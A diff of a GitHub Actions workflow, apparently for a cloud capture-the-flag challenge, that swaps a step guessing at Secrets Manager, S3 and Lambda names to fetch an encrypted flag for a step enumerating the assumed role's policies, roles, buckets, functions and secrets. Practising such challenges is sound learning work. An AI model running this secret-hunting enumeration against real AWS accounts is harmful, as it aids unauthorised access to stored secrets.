@@ -1,4 +1,4 @@
-name: Fetch Encrypted Flag
+name: Diagnose Role Permissions
 
 on: workflow_dispatch
 
@@ -7,7 +7,7 @@ permissions:
   contents: read
 
 jobs:
-  fetch:
+  diagnose:
     runs-on: ubuntu-latest
     steps:
       - name: Configure AWS Credentials
@@ -16,26 +16,25 @@ jobs:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
 
-      - name: Retrieve Encrypted Flag
+      - name: Check Role Permissions
         run: |
-          set -e
+          echo "=== Checking attached policies ==="
+          aws iam list-attached-role-policies --role-name imaginary-challenge
 
-          # Try Secrets Manager first (most likely)
-          echo "=== Trying Secrets Manager ==="
-          aws secretsmanager get-secret-value --secret-id encrypted-flag --query SecretString --output text || \
-          aws secretsmanager get-secret-value --secret-id flag --query SecretString --output text || \
-          aws secretsmanager get-secret-value --secret-id imagine --query SecretString --output text || \
-          echo "No secret found in Secrets Manager"
+          echo "=== Checking inline policies ==="
+          aws iam get-role-policy --role-name imaginary-challenge --policy-name inline-policy 2>/dev/null || echo "No inline policy"
 
-          # Try S3
-          echo "=== Trying S3 ==="
-          aws s3 ls 2>/dev/null | while read line; do
-            bucket=$(echo "$line" | awk '{print $3}')
-            echo "Checking bucket: $bucket"
-            aws s3 cp "s3://$bucket/flag.enc" ./flag.enc 2>/dev/null && cat ./flag.enc && exit 0 || true
-            aws s3 cp "s3://$bucket/encrypted" ./encrypted 2>/dev/null && cat ./encrypted && exit 0 || true
-          done
+          echo "=== Listing all IAM roles (if allowed) ==="
+          aws iam list-roles --query 'Roles[].RoleName' 2>/dev/null || echo "No permission to list roles"
 
-          # Try Lambda
-          echo "=== Trying Lambda ==="
-          aws lambda invoke --function-name get-flag /tmp/out.txt --cli-binary-format raw-in-base64-out && cat /tmp/out.txt || true
+          echo "=== Trying to get caller identity ==="
+          aws sts get-caller-identity
+
+          echo "=== Trying to list S3 buckets ==="
+          aws s3 ls 2>/dev/null || echo "No S3 access"
+
+          echo "=== Trying to list Lambda functions ==="
+          aws lambda list-functions --query 'Functions[].FunctionName' 2>/dev/null || echo "No Lambda access"
+
+          echo "=== Trying to list Secrets Manager secrets ==="
+          aws secretsmanager list-secrets --query 'SecretList[].Name' 2>/dev/null || echo "No Secrets Manager access"
